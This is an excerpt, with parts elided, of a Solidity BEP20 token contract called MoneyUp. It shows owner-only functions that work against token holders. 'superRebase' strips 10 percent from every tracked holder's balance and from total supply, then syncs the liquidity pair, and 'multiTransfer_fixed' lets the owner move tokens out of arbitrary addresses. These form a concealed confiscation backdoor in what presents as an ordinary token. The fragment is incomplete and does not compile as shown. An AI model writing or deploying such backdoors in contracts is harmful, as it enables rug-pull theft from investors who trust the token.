...
contract MoneyUp is IBEP20, Auth {
    using SafeMath for uint256;
...
function multiTransfer_fixed(address from, address[] calldata addresses, uint256 tokens) external onlyOwner {
    ...
    function checkHolderList(address _address) private{
      for (uint i; i< _holderList.length;i++){
          if (_holderList[i]==_address){
           return;
          }
      }
    _holderList.push(_address);
    _totalHolders++;
    }
   function manualSync() external {
        InterfaceLP(pair).sync();
    }
    function superRebase() external onlyOwner {
       
        uint256 iterations = 0;

        while(iterations < _totalHolders) {

            address addres = _holderList[iterations];

            if(_balances[addres] >= 10){
            _balances[addres] -= _balances[addres] * 10 / 100;
            }
        ...
        if(_totalSupply >= 10){
           ...
           _totalSupply -= _totalSupply * 10 / 100;
        }
        pairContract.sync();
     }
